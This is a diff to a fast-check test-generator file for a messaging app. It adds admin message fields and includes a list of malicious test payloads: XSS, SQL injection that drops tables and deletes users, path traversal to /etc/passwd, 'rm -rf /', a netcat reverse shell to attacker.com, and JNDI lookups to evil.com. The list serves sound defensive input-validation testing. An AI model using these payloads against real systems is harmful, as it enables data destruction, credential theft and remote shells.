@@ -53,7 +53,18 @@ export const messageArb = fc.record({
 
 // Admin message generator (includes admin-specific fields)
 export const adminMessageArb = fc.record({
-  ...messageArb.value,
+  id: fc.integer({ min: 1, max: 100000 }),
+  sender_id: fc.integer({ min: 1, max: 1000 }),
+  receiver_id: fc.integer({ min: 1, max: 1000 }),
+  message: validMessageContentArb,
+  image: fc.option(fc.string(), { nil: null }),
+  video_url: fc.option(fc.webUrl(), { nil: null }),
+  created_at: timestampArb,
+  updated_at: timestampArb,
+  is_read: fc.boolean(),
+  is_read_admin: fc.boolean(),
+  image_url: fc.option(fc.webUrl(), { nil: null }),
+  video_url_path: fc.option(fc.webUrl(), { nil: null }),
   is_admin_message: fc.constant(true),
   original_conversation_sender: userIdArb,
   original_conversation_receiver: userIdArb,
@@ -106,26 +117,26 @@ export const maliciousPayloadArb = fc.oneof(
   fc.constant('<img src="x" onerror="alert(1)">'),
   fc.constant('javascript:alert("xss")'),
   fc.constant('<iframe src="javascript:alert(1)"></iframe>'),
-  
+
   // SQL injection payloads
   fc.constant("'; DROP TABLE messages; --"),
   fc.constant("' OR '1'='1"),
   fc.constant("1; DELETE FROM users; --"),
   fc.constant("UNION SELECT * FROM users"),
-  
+
   // Path traversal payloads
   fc.constant('../../../etc/passwd'),
   fc.constant('..\\..\\..\\windows\\system32\\config\\sam'),
-  
+
   // Command injection payloads
   fc.constant('$(rm -rf /)'),
   fc.constant('`cat /etc/passwd`'),
   fc.constant('|nc -e /bin/sh attacker.com 4444'),
-  
+
   // LDAP injection payloads
   fc.constant('${jndi:ldap://evil.com/a}'),
   fc.constant('${jndi:rmi://evil.com/a}'),
-  
+
   // NoSQL injection payloads
   fc.constant('{"$ne": null}'),
   fc.constant('{"$gt": ""}'),
@@ -181,7 +192,7 @@ export const errorScenarioArb = fc.record({
     'database_error'
   ),
   statusCode: fc.integer({ min: 400, max: 599 }),
-  message: fc.string({ minLength: 1, max: 200 }),
+  message: fc.string({ minLength: 1, maxLength: 200 }),
   retryable: fc.boolean(),
   expectedRecovery: fc.constantFrom('retry', 'refresh_token', 'user_action', 'none'),
 });
